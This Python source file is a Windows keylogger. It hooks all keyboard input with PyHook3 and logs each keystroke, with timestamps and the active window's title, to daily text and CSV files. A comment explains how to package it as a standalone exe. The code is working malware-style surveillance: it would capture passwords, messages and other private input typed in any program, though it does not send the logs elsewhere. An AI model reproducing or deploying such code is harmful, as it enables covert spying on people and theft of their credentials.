# Created by Mantie N Reid II

import PyHook3
import os
import numpy.random.common
import numpy.random.bounded_integers
import numpy.random.entropy
import pythoncom
from datetime import datetime
import pandas as pd
import win32gui
import os
import zipfile


from filelock import Timeout, FileLock





# To get this into a exe. use pyinstaller --onefile  -F main23.py

global pathforlogs
global pathforlogsbackup

pathforlogs = os.path.join('LogFolders', 'logs')


# converts the text file to a table with headers.


def converttotable():
  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.

  if not os.path.exists(pathforlogs):
    os.makedirs(pathforlogs)

  locationofFileandNameForLogs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
  locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")


  try:
    f = open(locationofFileandNameForLogs, 'r')
  except FileNotFoundError:
    print("the file was not found. But keep going, it will be converted after  the text file created")
    return

  try:
    df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
    df.to_csv(locationofFileandNameForLogsTable, index=None, )

  except PermissionError:
    print("User has opened the table file, they still have it opened. Which means we cannot open it.  ")
    print("They need to close the file or we cannot access it. ")


# this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
def givenewline():
  datelogname = datetime.today().strftime('%m-%d-%Y')

  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')


  if not os.path.exists(pathforlogs):
    os.makedirs(pathforlogs)

  LocationofFileandName = os.path.join(pathforlogs, datelogname + "-logfile.txt")
  w = win32gui
  currentwindow = w.GetWindowText(w.GetForegroundWindow())

  logfile = open(LocationofFileandName, 'a+')

  logfile.write(
    "\n" + datetimestamp + "|" + currentwindow + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
  logfile.close()


# The main function of the program. It runs whenever a key is pressed.
def OnKeyboardEvent(event):
  global windowname

  w = win32gui
  currentwindow = w.GetWindowText(w.GetForegroundWindow())

  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
  datetimestamp = datetime.today().strftime(
    '%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed

  # pathforlogs = '/logs2/test'  # defines the folder where the logs will be stored

  path = os.getcwd()  # gets the current working directory

  if not os.path.exists(pathforlogs):
    os.makedirs(pathforlogs)

  print("The current working directory is %s" % path)

  LocationofFileandName = os.path.join(pathforlogs, datelogname + "-logfile.txt")
  LocationofFileandNameLockfile = os.path.join(pathforlogs, datelogname + "-logfile.txt.lock")


  logfile = open(LocationofFileandName, 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
  buffers = logfile.read()

  logfile.close()

  # open the file to write the current new keystrokes.

  logfile = open(LocationofFileandName, 'a+')

  windowname = event.WindowName
  keylogs = chr(event.Ascii)

  # This code will start a new line if the Current window that the user is using changes to a different window.
  def NewLineIfWindowChanges():
    w = win32gui
    currentwindow = w.GetWindowText(w.GetForegroundWindow())

    datelogname = datetime.today().strftime('%m-%d-%Y')
    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
    with open(LocationofFileandName, 'r') as fh:

      data = fh.readlines()

      try:
        lastline = data[-1]
        print(lastline)
      except IndexError:
        print('The last line has not been written yet, exit function and keep going')
        return

    if str(lastline).find(str(windowname)) != -1:
      'print("The window name  has not changed")'

    else:

      logfile2 = open(LocationofFileandName, 'a+')
      logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
      logfile2.close()
      print("the window has  changed")



  if event.Ascii == 13:  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
    keylogs = '\n' + datetimestamp + "|" + currentwindow + "|" + " "

  # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
    # keylogs = ' <Backspace> '

  if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
    keylogs = ''

  if event.Ascii == 9:
    keylogs = ' <Tab> '

  windowid = event.Window

  buffers += keylogs  # Whatever is keylogs equal to, Gets added to the buffers variable.
  NewLineIfWindowChanges()


  logfile.write(buffers)  # writes the key pressed  to the file

  logfile.close()  # closes the file
  converttotable()
  return True





def main():
  hm = PyHook3.HookManager()
  hm.KeyDown = OnKeyboardEvent

  hm.HookKeyboard()

  pythoncom.PumpMessages()

  givenewline()


if __name__ == "__main__":
  givenewline()
  print("The program has started, Start typing!")
  main()
